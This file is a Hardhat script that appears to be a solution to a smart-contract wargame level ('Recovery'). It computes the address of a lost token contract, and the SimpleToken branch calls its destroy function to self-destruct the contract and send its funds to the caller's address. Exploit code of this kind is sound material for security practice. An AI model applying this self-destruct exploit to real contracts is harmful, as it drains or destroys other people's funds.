import { ethers } from "hardhat";

const FOUND_CONTRACT_ADDR = "0xd694ce85503de9399d4deca3c0b2bb3e9e7cfcbf9c6b01";
const FOUND_CONTRACT = "0xe0f70d0b6dacacebb0c629da2408afbfa81775df";
const MY_ADDRESS = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";
const RECOVERY_ADDRESS = "0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B";

async function main() {
  if (FOUND_CONTRACT) {
    const SimpleToken = await ethers.getContractFactory("SimpleToken");
    const simpleToken = await SimpleToken.attach(FOUND_CONTRACT);
    console.log("SimpleToken attached to:", simpleToken.address);

    console.log("SimpleToken name: ", await simpleToken.name());
    console.log("Destroying SimpleToken...");
    await simpleToken.destroy(MY_ADDRESS);
    console.log("SimpleToken name: ", await simpleToken.name());
  } else {
    var recovery;
    if (RECOVERY_ADDRESS) {
      const Recovery = await ethers.getContractFactory("Recovery");
      recovery = await Recovery.attach(RECOVERY_ADDRESS);

      console.log("Recovery attached to:", recovery.address);
    } else {
      const Recovery = await ethers.getContractFactory("Recovery");
      recovery = await Recovery.deploy();
      await recovery.deployed();
      console.log("Recovery deployed to:", recovery.address);
    }

    const RecoveryHack = await ethers.getContractFactory("RecoveryHack");
    const recoveryHack = await RecoveryHack.deploy();
    await recoveryHack.deployed();
    console.log("RecoveryHack deployed to:", recoveryHack.address);

    console.log("Hacking recovery contract...");
    await recoveryHack.getTheAddress(FOUND_CONTRACT_ADDR);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
